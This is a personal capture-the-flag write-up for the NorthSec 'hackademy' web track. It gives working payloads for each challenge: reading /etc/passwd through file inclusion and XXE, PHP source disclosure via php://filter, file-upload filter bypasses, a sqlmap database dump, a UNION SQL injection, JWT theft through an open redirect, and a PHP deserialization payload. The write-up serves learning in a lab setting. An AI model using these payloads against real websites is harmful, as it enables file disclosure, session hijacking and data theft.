## hackademy-writeup

Every year, I participate in the NorthSec CTF, and every year, when I come face to face with the hackademy track, my mind just goes blank.
This writeup is intended for personal use in the same track next year, but hey, I made the repo public if it can help anyone!

### Automatization 101
Check source code

### Automatization 102
Look at the robots.txt file

### Inclusion 101
Change the ```?page=welcome.php``` to ```/etc/passwd```

### Inclusion 102
This is an XXE, check the source code, then catch the request in burp, modify the body in the repeater for something like this:<br>
```<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY ext SYSTEM "file:///etc/passwd" >]><function><getConversation>&ext;</getConversation></function>```

(thanks lolkatz)

### Inclusion 103
PHP convert to Base64... add ```php://filter/convert.base64-encode/resource=index.php``` after the ```?page=```<br>
Decode the string

### Upload 101
Create a basic PHP script like ```<?php echo 'Hello World'; ?>``` and name it script.jpg.php (security only checks the first .xxx)

### Upload 102
Upload the script created in Upload 101 and catch the request in Burp Repeater and change the ```Content-type``` to ```image/jpeg```

### Upload 103
This step checks the file signature, force the PNG file signature ```89 50 4E 47 0D 0A 1A 0A``` in the first bytes of the script created earlier

### Upload 104
Same as upload 101 but change the name of the script to script.png.php3

### SQL 101
Kinda hard for a 101 track, but use sqlmap with this command:```sqlmap u "URL HERE" --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ```

### SQL 102
Directly in the username field, enter the injection: ```' union SELECT '','',''--```

### Open Redirect 101
My team owns a small server on the CTF network, so we redirect the user there ```URL.ctf/?sub_url=http://shell.ctf```<br>
Look at the logs on the server, we can see his JWT token.<br>
Go to ```URL.ctf/?identity=(insert JWT)``` (reminder; the token is only valid for 20mins)

### Serialize 101
Look at the source code and change the WelcomeMessage function by the function that outputs the base64 string, GiveMeFlagPrettyPlease()<br>
This is the final payload:<br>
```<?php
    class Hackademy{
        private $call = "GiveMeFlagPrettyPlease";
    }   
    $serialized = serialize(new Hackademy());

    // Output
    echo "Serialized:\n";
    echo $serialized;
    echo "\n";
    echo "Encoded:\n";
    echo base64_encode($serialized);
    echo "\n";
?>```

I then use the output in the URL parameter, and it gives me the flag :)

### Forgery 101

### Forgery 102

### Forgery 103


